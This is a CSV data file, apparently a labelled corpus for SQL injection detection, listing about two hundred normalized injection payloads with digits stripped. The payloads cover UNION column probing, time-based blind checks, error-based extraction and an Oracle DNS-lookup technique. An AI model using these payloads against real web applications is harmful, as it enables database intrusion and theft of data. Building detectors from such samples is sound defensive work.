,language,source
3516,sql,". . . / / / ? = & = & =   "" ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3517,sql,". . . ? = & = & =   AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) # "
3518,sql,". . / ? =   ' ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ( ' crVC ' = ' "
3519,sql,". . / / / ? = & =   "" ) ) UNION ALL SELECT NULL , NULL # "
3520,sql,". . . / / / / ? =  - ORDER BY # "
3521,sql,". . . . ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3522,sql,". . . / ? = & = & = & =   ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' yvxE ' = ' "
3523,sql,". . / ? = & = & = & =   ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' RPLO ' LIKE ' "
3524,sql,". . . . / / / / ? =   ' ) ; SELECT SLEEP ( ) AND ( ' eGdw ' LIKE ' "
3525,sql,". . . / ? = & =   ' ) ) AND SLEEP ( ) AND ( ( ' CGdY ' = ' "
3526,sql,". . . . / ? = & =   ) ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ( = "
3527,sql,". . . . ? = & =   % ' AND =  -- "
3528,sql,". . . . / / / / ? = & = & = & =  - % ' ) UNION ALL SELECT , , , , , , , ,  -- "
3529,sql,". . / / ? = & = & =   ' ) ) ORDER BY  -- "
3530,sql,". . . . / / / / ? = & = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3531,sql,". . . / / / ? =   % ' ) ) AND = AND ( ( ' % ' = ' "
3532,sql,". . / ? =   ' ) ) ) ; SELECT SLEEP ( ) AND ( ( ( ' XTLY ' = ' "
3533,sql,". . . / / ? = & =   ( SELECT ( CASE WHEN ( = ) THEN DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) ELSE  END ) FROM DUAL ) "
3534,sql,". . . / / / ? =  - ' UNION ALL SELECT , , ,  -- "
3535,sql,". . ? =   "" ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( " buyI " LIKE " "
3536,sql,". . . / / ? = & = & = & =   % ' UNION ALL SELECT NULL -- "
3537,sql,". . . . / / / ? = & =  - "" ) UNION ALL SELECT , , , , , ,  -- "
3538,sql,". . . . ? = & =   ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
3539,sql,". . / ? = & =   ' ) ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ( ' GeIw ' = ' "
3540,sql,". . . . ? = & = & = & =   ' AND = AND ' CULc ' LIKE ' "
3541,sql,". . . / / / / ? = & =  - ' ORDER BY  -- "
3542,sql,". . . / / / ? = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3543,sql,". . . . ? =   "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " KCKZ " LIKE " "
3544,sql,". . . / / ? = & =    UNION ALL SELECT NULL , NULL , NULL , NULL # "
3545,sql,". . / ? = & =  - "" ) UNION ALL SELECT , , , , , , , , ,  -- "
3546,sql,". . ? =  - "" ) UNION ALL SELECT , , , , , ,  -- "
3547,sql,". . / ? = & = & =   ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( = "
3548,sql,". . . / / / ? = & =   % ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' % ' = ' "
3549,sql,". . . . ? = & = & = & =   ' ) ) AND MAKE_SET ( = , ) AND ( ( ' mEIK ' = ' "
3550,sql,". . . / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3551,sql,". . / / / / ? =  IIF ( = , , / ) "
3552,sql,". . . / / ? = & = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3553,sql,". . . / / / ? = & = & =   ' ) ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
3554,sql,". . . / / / / ? =   AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
3555,sql,". . . / ? =   ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( = "
3556,sql,". . . ? =   ' ) ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
3557,sql,". . / / / ? = & =   ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
3558,sql,". . ? = & = & = & =   ( SELECT CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
3559,sql,". . . . / / / ? = & =   ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3560,sql,". . . ? = & = & = & =   "" ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( " ySHb " = " "
3561,sql,". . . / / ? =   ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( = "
3562,sql,". . ? = & = & =  - UNION ALL SELECT # "
3563,sql,". . . ? = & = & =   ' ) ) ) AND SLEEP ( ) AND ( ( ( ' RnOS ' = ' "
3564,sql,". . . / / ? =  - ' UNION ALL SELECT , , , ,  -- "
3565,sql,". . ? = & =   ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
3566,sql,". . / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3567,sql,". . . / / ? =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3568,sql,". . / / ? = & = & = & =  - ' UNION ALL SELECT , , , ,  -- "
3569,sql,". . . / / ? = & = & =   ' UNION ALL SELECT NULL # "
3570,sql,". . / ? = & = & = & =  - ' ) UNION ALL SELECT , , , ,  -- "
3571,sql,". . / / / ? = & = & = & =   ) ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ( = "
3572,sql,". . . . / ? = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
3573,sql,". . ? = & =    AND SLEEP ( ) "
3574,sql,". . / ? = & = & =  - % "" UNION ALL SELECT , , , , , , , , , # "
3575,sql,". . / ? = & =   % ' ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3576,sql,". . . . / / / ? =   ' ) AND SLEEP ( ) AND ( ' rLaj ' = ' "
3577,sql,". . . . / / / / ? = & =   ) ) AND = % "
3578,sql,". . . . ? = & =  - ' ) UNION ALL SELECT , , , , # "
3579,sql,". . . . / / / / ? = & = & =   ) ) ; SELECT PG_SLEEP ( )  --"
3580,sql,". . / / ? = & =   ' ) ) AND =  -- "
3581,sql,". . / ? = & = & =   AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
3582,sql,". . ? = & =   PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) "
3583,sql,". . . / / / / ? = & =   "" ; SELECT PG_SLEEP ( )  --"
3584,sql,". . . ? = & = & =   ' , ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )  -- "
3585,sql,". . . / / / / ? = & =  - ' ) ) ORDER BY  -- "
3586,sql,". . . . / / ? = & = & =   ' ORDER BY # "
3587,sql,". . . / / / ? =   "" ) AND =  -- "
3588,sql,". . / / / / ? = & = & =   "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " cGME " LIKE " "
3589,sql,". . . . / / / ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3590,sql,". . / ? = & = & = & =   "" ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ( " dNsq " = " "
3591,sql,". . / / / ? = & = & = & =  - % ' UNION ALL SELECT , , , # "
3592,sql,". . . / / ? = & =  - "" UNION ALL SELECT , , , , , , ,  -- "
3593,sql,". . / / ? = & =  - ) ) UNION ALL SELECT , , , , , , , , # "
3594,sql,". . . . / / / ? =   ' AND =  -- "
3595,sql,". . . . / / / / ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' VdmP ' LIKE ' "
3596,sql,". . ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL -- "
3597,sql,". . . / ? =   "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " pZqB " = " "
3598,sql,". . . / / ? =   ' AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
3599,sql,". . . / / / / ? =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL # "
3600,sql,". . / ? = & =    AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
3601,sql,". . / / ? = & = & = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
3602,sql,". . . . / ? =  - ' UNION ALL SELECT , , , , # "
3603,sql,". . . / / ? = & =   ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3604,sql,". . / / ? = & =  - "" ) ) UNION ALL SELECT , , ,  -- "
3605,sql,". . . . / / ? = & = & = & =   % ' UNION ALL SELECT NULL # "
3606,sql,". . . . / / / / ? = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3607,sql,". . / / ? = & = & =   ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3608,sql,". . . . / / / / ? = & = & =   % ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3609,sql,". . / ? = & =   % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3610,sql,". . . . ? = & = & = & =   ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' AXoi ' LIKE ' "
3611,sql,". . . . / / ? = & =   % ' ) AND = % "
3612,sql,". . . / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , , ,  -- "
3613,sql,". . . . / / ? =  - ' UNION ALL SELECT  -- "
3614,sql,". . / ? = & = & = & =   ' ) ) ) AND MAKE_SET ( = , ) AND ( ( ( ' akCs ' = ' "
3615,sql,". . . . / / ? = & = & = & =   % ' ) AND = # "
3616,sql,". . / / ? =   "" ) AND =  -- "
3617,sql,". . . / / ? = & = & =   ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' GHvB ' LIKE ' "
3618,sql,". . . ? = & = & = & =   ) AND MAKE_SET ( = , ) AND ( = "
3619,sql,". . / / ? = & = & = & =  - "" ) ) UNION ALL SELECT , , , , , # "
3620,sql,". . / ? =   ' ) ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ( ' cTax ' = ' "
3621,sql,". . . . / / ? = & =   AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
3622,sql,". . / / ? = & = & = & =  - "" ) ) UNION ALL SELECT , , , , , , , ,  -- "
3623,sql,". . . . ? = & =  - ) ) ) ORDER BY # "
3624,sql,". . . . / / ? = & = & = & =  - % ' UNION ALL SELECT , , , , ,  -- "
3625,sql,". . / / / ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3626,sql,". . . . / ? =  - ' UNION ALL SELECT , # "
3627,sql,". . / / / / ? =   "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( " oZJE " = " "
3628,sql,". . . / / / / ? = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL # "
3629,sql,". . . . / / / / ? =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3630,sql,". . ? =   ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Bcts ) # "
3631,sql,". . / ? = & = & =   "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " udFP " = " "
3632,sql,". . / ? = & = & = & =  - "" ) ) UNION ALL SELECT  -- "
3633,sql,". . / ? = & =  - UNION ALL SELECT ,  -- "
3634,sql,". . . . ? =  - % "" ORDER BY # "
3635,sql,". . . / ? = & = & =   ' ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3636,sql,". . . . / / / / ? =  - UNION ALL SELECT , , , ,  -- "
3637,sql,". . . . / / ? = & = & =   % ' ) ) AND = AND ( ( ' % ' = ' "
3638,sql,". . ? =   % ' ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( ' % ' = ' "
3639,sql,". . . ? =   ' , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s )  -- "
3640,sql,". . / / / / ? = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
3641,sql,". . / / ? = & =   ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' MzdI ' LIKE ' "
3642,sql,". . . . / / / ? =  - ' UNION ALL SELECT , , # "
3643,sql,". . . / / / ? =   ) ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ( = "
3644,sql,". . . / / / ? = & = & =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' MEbL ' LIKE ' "
3645,sql,". . / / ? = & = & = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ' TmEQ ' LIKE ' "
3646,sql,". . . / / ? =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' nXkQ ' = ' "
3647,sql,". . . / / / ? = & = & =   ) ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ( = "
3648,sql,". . . . / / / ? = & =   RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) "
3649,sql,". . . . ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3650,sql,". . . . ? = & = & = & =   % ' ) ) ; WAITFOR DELAY ' : : '  --"
3651,sql,". . . ? =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
3652,sql,". . / / ? = & =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( ( ' VZzc ' = ' "
3653,sql,". . / / / / ? = & =   "" ) AND = AND ( " Izdj " = " "
3654,sql,". . . . / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL # "
3655,sql,". . . . / / ? = & = & =    AND =  -- "
3656,sql,". . . . / / ? = & = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3657,sql,". . . / ? = & = & =    ORDER BY # "
3658,sql,". . ? = & =   ) ) ) ; SELECT SLEEP ( ) # "
3659,sql,". . / ? = & =   ' AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ' dzMS ' LIKE ' "
3660,sql,". . . . / / / / ? = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3661,sql,". . / / ? =   % ' ) ) AND = % "
3662,sql,". . / / / / ? = & = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
3663,sql,". . . . / / / / ? =   . "
3664,sql,". . / / / / ? = & = & = & =   ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' tayP ' = ' "
3665,sql,". . . / / / / ? =   ' ) AND =  -- "
3666,sql,". . . . / / / / ? = & = & = & =  - ' UNION ALL SELECT , , # "
3667,sql,". . . . ? = & = & = & =   ' AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ' zFxM ' = ' "
3668,sql,". . . . / / / ? = & = & = & =    AND MAKE_SET ( = , )  -- "
3669,sql,". . . . / / / ? =   "" ) ORDER BY  -- "
3670,sql,". . . / ? = & = & =  - UNION ALL SELECT , , , # "
3671,sql,". . . . / / / ? = & = & =   ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' tayP ' = ' "
3672,sql,". . . . / / ? =   AND SLEEP ( ) # "
3673,sql,". . . / / / / ? = & = & =  - "" ORDER BY  -- "
3674,sql,". . . . / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3675,sql,". . . / / ? = & = & = & =   ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( = "
3676,sql,". . / / / ? =   ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( = "
3677,sql,". . . / / / ? = & = & =   ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ' jIJS ' LIKE ' "
3678,sql,". . . ? = & =  - ) UNION ALL SELECT  -- "
3679,sql,". . / / ? = & = & = & =  - ) ORDER BY  -- "
3680,sql,". . / ? = & = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( = "
3681,sql,". . / / ? = & = & =   % ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3682,sql,". . . . / ? = & = & =  - ' ) ) UNION ALL SELECT , , # "
3683,sql,". . . ? = & =   ' ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ' qpyK ' LIKE ' "
3684,sql,". . / / / ? = & =   ) ) ) AND MAKE_SET ( = , ) AND ( ( ( = "
3685,sql,". . . . / ? = & = & = & =   ) UNION ALL SELECT NULL # "
3686,sql,". . . ? = & = & = & =  - % ' UNION ALL SELECT , , , , , # "
3687,sql,". . . . ? = & = & =   "" ) UNION ALL SELECT NULL # "
3688,sql,". . . / / ? = & = & = & =   ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' zJth ' = ' "
3689,sql,". . / / / ? = & =   ' ) ) AND SLEEP ( ) AND ( ( ' eWzK ' LIKE ' "
3690,sql,". . . . ? =   % ' ORDER BY  -- "
3691,sql,". . / / / ? = & = & = & =   ) AND =  -- "
3692,sql,". . ? = & =  - % ' ) UNION ALL SELECT , , , , ,  -- "
3693,sql,". . . . / ? = & = & =  - "" ) UNION ALL SELECT  -- "
3694,sql,". . / / / ? = & = & = & =   % ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' % ' = ' "
3695,sql,". . . / / / ? = & = & =   ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ' hCoq ' LIKE ' "
3696,sql,". . / / / / ? = & = & =   ' ) ) ) RLIKE SLEEP ( ) AND ( ( ( ' ukrT ' = ' "
3697,sql,". . . . / ? = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3698,sql,". . . ? =   % ' ) ) UNION ALL SELECT NULL # "
3699,sql,". . / / ? = & = & = & =   "" ) ; SELECT SLEEP ( ) AND ( " xzdz " = " "
3700,sql,". . . . / / / / ? = & = & = & =   % ' ) ORDER BY  -- "
3701,sql,". . . / ? = & =  - ) ) UNION ALL SELECT , ,  -- "
3702,sql,". . ? =    ORDER BY  -- "
3703,sql,". . . / / / / ? = & = & =   % "" ORDER BY  -- "
3704,sql,". . . . / / ? =   % ' ) AND = AND ( ' % ' = ' "
3705,sql,". . . . / / / ? = & = & = & =   AND =  -- "
3706,sql,". . . / / / / ? =  - ) ) ) ORDER BY  -- "
3707,sql,". . . . / ? = & =  - ' UNION ALL SELECT  -- "
3708,sql,". . / / / / ? = & = & =   % ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' % ' = ' "
3709,sql,". . ? = & = & = & =   ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ' scip ' = ' "
3710,sql,". . / / ? =   AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) # "
3711,sql,". . . . / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , ,  -- "
